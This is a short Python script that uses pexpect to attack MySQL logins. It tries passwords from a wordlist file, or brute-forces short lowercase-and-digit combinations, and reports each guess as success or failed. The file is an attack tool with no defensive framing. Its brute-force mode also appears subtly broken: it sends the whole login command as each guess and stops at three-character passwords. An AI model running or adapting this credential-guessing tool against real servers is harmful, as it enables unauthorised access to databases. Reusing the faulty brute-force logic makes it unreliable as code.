import pexpect
import sys
import time
import string
import itertools


try:
  login_command = sys.argv[1]
  flags = sys.argv[2]
  if flags == "-D":
    filename = sys.argv[3]
except:
  print("please enter the right command")

if flags == "-D":
  file = open(filename, 'r')
  passwords = file.readlines()

  for password in passwords:
    try:
      child = pexpect.spawn(login_command + password)
      i = child.expect('mysql> ')
      print("[*] " + password.strip() + " |  success")
      break;
    except:
      print("[*] " + password.strip() + " |  failed")
      continue

  file.close()

elif flags == "-B":
  is_found = False
  chars = string.ascii_lowercase + string.digits
  child = pexpect.spawn(login_command + '1234')
  for password_length in range(4):
    for guess in itertools.product(chars, repeat=password_length):
      guess = ''.join(guess)
      if guess == "":
        continue
      try:
        child.sendline(login_command + guess)
        i = child.expect('mysql> ')
        is_found = True
        print("[*] " + guess + " |  success")
        break
      except:
        print("[*] " + guess + " |  failed")
        continue
    if is_found:
      break

